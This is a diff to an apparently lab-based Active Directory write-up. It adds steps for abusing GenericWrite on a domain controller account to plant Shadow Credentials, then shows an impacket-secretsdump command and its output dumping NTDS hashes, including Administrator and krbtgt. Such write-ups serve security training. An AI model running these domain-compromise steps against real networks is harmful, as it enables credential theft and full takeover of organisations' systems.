@@ -305,6 +305,9 @@ SOAPy MILLENNIUM.CORP/sully@DC01.MILLENNIUM.CORP -k --users
 
 ### Step 1 — Shadow Credentials against the DC machine account
 
+With `sully`'s TGT loaded, abuse sully's **GenericWrite** on `DC01$` to append
+an attacker-controlled key credential to the DC's `msDS-KeyCredentialLink`:
+
 <img width="1105" height="502" alt="image" src="https://github.com/user-attachments/assets/14f181b9-6c50-4ef2-8cea-6c11af58ec99" />
 
 ```
@@ -379,10 +382,28 @@ ntdsutil "activate instance ntds" "ifm" "create full C:\Users\ATHENA\Documents\N
 ### Offline secretsdump
 
 ```
-secretsdump -ntds ntds.dit -system system LOCAL
+impacket-secretsdump -ntds ntds.dit -system system LOCAL
+
 ```
 
 → **`krbtgt` NT hash extracted.** Full domain compromise achieved.
+
+```
+┌─[10.200.120.60]─[donmed@MyBitByte]─[~/LAB/Hacksmarter/Millennium]
+└──╼ [★ ]$ impacket-secretsdump -ntds ntds.dit -system system LOCAL
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xd47dad50d8f833994cb60e80f24afb62
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: c1f0243ae205440f233ee1f974ab5298
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0d26b80bbd357288f21dd4aafecf9c45:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5c72593d9552612093430f0b40d112bc:::
+ 
+```
 
 ---
 
